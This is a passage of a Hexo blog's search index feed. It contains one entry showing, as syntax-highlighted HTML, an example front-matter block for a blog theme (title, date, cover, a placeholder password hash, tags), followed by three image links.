        <content type="html"><![CDATA[<pre class="line-numbers language-js"><code class="language-js"><span class="token operator">--</span><span class="token operator">-</span>title<span class="token punctuation">:</span> typora<span class="token operator">-</span>vue<span class="token operator">-</span>theme主题介绍date<span class="token punctuation">:</span> <span class="token number">2018</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">07</span> <span class="token number">09</span><span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token number">00</span>author<span class="token punctuation">:</span> jackliuimg<span class="token punctuation">:</span> <span class="token operator">/</span>source<span class="token operator">/</span>images<span class="token operator">/</span>xxx<span class="token punctuation">.</span>jpgtop<span class="token punctuation">:</span> <span class="token boolean">true</span>cover<span class="token punctuation">:</span> <span class="token boolean">true</span>coverImg<span class="token punctuation">:</span> <span class="token operator">/</span>images<span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>jpgpassword<span class="token punctuation">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc<span class="token punctuation">:</span> <span class="token boolean">false</span>mathjax<span class="token punctuation">:</span> <span class="token boolean">false</span>summary<span class="token punctuation">:</span> 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories<span class="token punctuation">:</span> Markdowntags<span class="token punctuation">:</span>  <span class="token operator">-</span> Typora  <span class="token operator">-</span> Markdown<span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/11/28/blogSet/1.png"></p><p><img src="/2021/11/28/blogSet/2.png"></p><p><img src="/2021/11/28/blogSet/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
